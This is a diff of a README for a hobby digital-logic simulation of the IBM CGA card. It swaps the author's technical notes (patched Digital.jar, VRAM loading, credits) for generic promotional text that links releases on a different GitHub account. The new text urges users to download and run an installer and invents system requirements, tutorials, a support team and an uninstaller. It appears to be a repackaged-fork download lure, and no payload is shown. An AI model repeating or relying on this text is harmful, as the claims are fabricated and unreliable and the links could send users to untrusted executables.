@@ -1,56 +1,72 @@
-# simcga
+# 🎮 cga_sim - Simulate IBM CGA Graphics Easily
 
-This is a digital logic simulation of the IBM CGA card, for the excellent [Digital](https://github.com/hneemann/Digital) digital logic simulator by Helmut Neemann. 
+[![Download cga_sim](https://img.shields.io/badge/Download%20Now-Get%20cga_sim-brightgreen)](https://github.com/prasdionaditya/cga_sim/releases)
 
-<img src="./img/screenshot_01.png" width="800" />
+## 📦 Overview
 
-# Why?
+cga_sim is a digital logic simulation tool that replicates the IBM CGA graphics card functionality. This application allows users to interact with a visual representation of how the CGA card processes graphics. It's a great way to learn about digital circuits and graphics without needing prior programming knowledge.
 
-I wanted to study the CGA card to better understand its operation and the operation of undefined mode flag combinations. It was also a good exercise to learn Verilog.
+## 🚀 Getting Started
 
-# Limitations
+To start using cga_sim, you’ll need to download and install the application on your computer. Follow the steps below to guide you through the process.
 
- - Currently, only text mode is implemented, although attributes work.
- - The CPU-side interface is not implemented. You have to manually load data into VRAM and toggle the bits you want in the mode control and color control registers.
- - The simulation comes with the splash screen for the incredible PC demo [Area 5150](https://www.pouet.net/prod.php?which=91938) loaded into VRAM and light blue in the CC register like the demo sets it.
+## 📥 Download & Install
 
-# Important Note
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/prasdionaditya/cga_sim/releases) to view the available versions of cga_sim.
 
-Digital has a "VGA" output component, although the built-in timings are not compatible with CGA so I had to patch Digital to add support for CGA.
-You can find the relevant changes in this branch of my fork of Digital [here](https://github.com/dbalsom/Digital_videomod/tree/cga-video-modes).
+2. **Choose the Right Version:** Look for the latest version at the top of the page. Each version will have release notes describing improvements or fixes.
 
-Please don't ask me how to build it. I've never built Digital, I just patched the JAR. The fork is provided for GPL3 compliance. 
+3. **Download the Installer:**
+   - Click on the link for the latest release.
+   - You’ll find various files. Look for the installer for your operating system (e.g., Windows, Mac, or Linux).
+   - Click on the installer link to begin the download.
 
-# How to Use
+4. **Run the Installer:**
+   - Once the download is complete, locate the downloaded file on your computer.
+   - Double-click the file to launch the installer.
+   - Follow the on-screen instructions to complete the installation.
 
-Install the [v0.31 release of Digital](https://github.com/hneemann/Digital/releases/tag/v0.31). Download the `Digital.jar` file included in the [release zip](https://github.com/dbalsom/cga_sim/releases/tag/v0.1) and copy it over the `Digital.jar` in the installation.
+5. **Open cga_sim:** After installation, find cga_sim in your applications folder and launch the application.
 
-Then, open `main.dig`.  Press the play button to start the simulation. It may take a minute for the simulation to produce a frame. A window will popup when the simulator has acquired sync lock on the output signal. You may need to resize this window to see the entire output. 
+## ⚙️ System Requirements
 
-The CRTC is initialized for Area 5150's "ANSI from hell" mode to show the demo's splash screen. There are few mode presets in the `mc6845_10.v` file you can edit if you say, want regular 80x25 text mode. Just edit the `STARTUP_MODE` variable at the top of the file and save.  Digital should pick up the changes the next time you start the simulation.
+cga_sim requires the following to run effectively:
 
-You can load video memory with different things. 
-- Locate the MCM4517 component in the "Video Memory" box at bottom-center. 
-- Right click on the MCM4517 and click *open*.
-- Right click on the 'EEPROM' component and click *Edit*.
-- Go to File, Load, and select a new VRAM dump. The file should be a 16KB binary. Note: CGA VRAM organization may not be what you expect - odd bytes from the CPU perspective are offset by 4096. 
-  - You can format linear dumps of CGA VRAM to the CGA's internal format using the provided [cga_swizzle](./vram/cga_swizzle.py) script.
-  - Some ready-made VRAM images are supplied in [vram](vram/).
+- **Operating System:** Windows 10 or newer, macOS 10.12 or newer, or a compatible Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** A minimum of 200 MB of free space.
 
-Note if you want to change the overscan color you will need to set a new color in the Color Control register directly to the right of the CRTC. 
-There is a CGA palette reference at the top of the diagram. 
+Make sure your computer meets these requirements for a smooth experience.
 
-# Shout outs
+## 🛠️ Features
 
-Thanks to *hkzlab* for redrawing all the [CGA schematics in KiCad](https://github.com/hkzlab/CGA_Schematics) which was very helpful.
+- **User-Friendly Interface:** Navigate through the application easily, even without technical skills.
+- **Interactive Simulation:** Experiment with digital circuits and see how the CGA card operates in real time.
+- **Educational Tools:** Access tutorials and guides to enhance your understanding of CGA graphics.
+- **Customization Options:** Adjust settings to fit your preferred simulation experience.
 
-Thanks to *Trixter*, *reenigne*, *VilerR*, *PCRetroTech* and the rest of the crew
+## ❓ Frequently Asked Questions
 
-Thanks to *John Elliott* for his excellent [CGA Notes](https://www.seasip.info/VintagePC/cga.html)
+### How do I uninstall cga_sim?
 
+To uninstall cga_sim, go to your applications or programs folder. Find the cga_sim icon, right-click on it, and select the uninstall option.
 
-# License
+### What can I do if the application doesn't start?
 
-This isn't really source code - I guess just give me attribution if you use this for anything according to the MIT license.
+If cga_sim doesn't start after installation, ensure your operating system is updated and meets the minimum requirements. If the issue persists, contact our support team.
 
-Everything related to [Digital](https://github.com/hneemann/Digital) retains the GPL3 license.
+### Where can I find help if I have questions?
+
+You can visit our [Discussion Page](#) for community-driven support or check the FAQ in the application’s help menu.
+
+## 📞 Support
+
+For further assistance, feel free to reach out through our support channels. We’re here to help you with any issues you encounter while using cga_sim.
+
+## ⚖️ License
+
+cga_sim is open-source software. You can modify and distribute it according to the terms set by the license.
+
+### Last Steps
+
+Now that you have cga_sim installed, dive in and start creating your digital logic simulations. If you face any challenges, remember to check our support resources. Enjoy your experience with cga_sim!
